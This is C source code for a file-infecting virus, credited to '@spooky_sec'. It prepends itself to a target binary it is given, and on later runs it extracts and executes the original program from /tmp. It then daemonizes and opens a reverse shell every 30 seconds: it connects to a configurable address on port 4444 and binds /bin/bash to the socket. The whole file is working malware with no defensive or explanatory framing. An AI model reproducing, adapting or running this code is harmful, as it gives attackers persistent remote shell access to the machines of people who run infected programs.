#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444
#define RED "\x1b[31m"
#define GREEN "\x1b[32m"
#define YELLOW "\x1b[33m"
#define BLUE "\x1b[34m"
#define MAGENTA "\x1b[35m"
#define CYAN "\x1b[36m"
#define RESET "\x1b[0m"
const int fileSize = 18112;

long int findSize(char fileName[]) { 
    FILE* fp = fopen(fileName, "r"); 
    if (fp == NULL) { 
        printf(RED"File Not Found!\n"RESET); 
        return -1; 
    } 
    fseek(fp, 0L, SEEK_END); 
    long int res = ftell(fp); 
    fclose(fp); 
    return res; 
}

int isInfected(char *fileName){
    if (findSize(fileName) == fileSize) {
        return 0;
    }
    else {
        return 1;
    }
}

void infect(char *localFileName, char *targetFileName) {
    int ch;
    FILE *localFile = fopen(localFileName, "rb");
    FILE *targetFile = fopen(targetFileName, "r+b");
    FILE *tempFile = fopen("tempFile.bin", "wb+");
    if (tempFile == NULL) {
        perror("tempFile");
    }

    if (targetFile == NULL) {
        printf(RED"[!] Target file not found!\n"RESET);
    }

    if (localFile == NULL) {
        perror("localFile");
    }

    while((ch = fgetc(localFile)) != EOF) {
        fputc(ch, tempFile);
    }

    while ((ch = fgetc(targetFile)) != EOF) {
        fputc(ch, tempFile);
    }

    fclose(localFile);
    fclose(targetFile);

    if (rename("tempFile.bin", targetFileName) != 0) {
        printf(RED"[!] Could not overwrite the target binary!\n"RESET);
        perror("rename");
    }

    chmod(targetFileName, S_IRWXU);
}

void execPayload() {
    struct sockaddr_in sa;
    int s;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);
    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof sa);
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    execve("/bin/bash", 0, 0);
}
void daemonize() {
        pid_t pid, sid;
        pid = fork();
        if (pid < 0) {
                exit(EXIT_FAILURE);
        }
        if (pid > 0) {
                exit(EXIT_SUCCESS);
        }
        umask(0);
        sid = setsid();
        if (sid < 0) {
                exit(EXIT_FAILURE);
        }

        if ((chdir("/")) < 0) {
                exit(EXIT_FAILURE);
        }
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        while (1) {
            execPayload();
            sleep(30);
        }
   exit(EXIT_SUCCESS);
}
void execOriginal(char *localFileName) {
    FILE *localFile = fopen(localFileName, "rb");
    FILE *tempFile  = fopen("/tmp/temp", "w+b");
    if (tempFile == NULL) {
        perror("TEMP FILE");
    }
    fseek(localFile, fileSize, SEEK_SET);
    int ch;
    while ( ( ch = fgetc(localFile) ) != EOF ) {
        fputc(ch, tempFile);
    }
    fclose(tempFile);
    chmod("/tmp/temp", S_IRWXU);
    system("/tmp/temp");
    remove("/tmp/temp");
}

int main(int argc, char *argv[]) {
    if (!isInfected(argv[0])) {
        if (argc != 2) {
            printf(GREEN"Usage: "MAGENTA"%s "CYAN"<target file>\n"RESET, argv[0]);
            exit(1);
        } else {
            infect(argv[0], argv[1]);
            printf(GREEN"[*] Infecting...\n");
            sleep(2);
            printf(YELLOW"[+] Infected!!!"RESET"\n");
            printf(RED"[!] Made by: @spooky_sec"RESET"\n");
            exit(0);
        }
    } else {
        execOriginal(argv[0]);
        daemonize();
    }
}

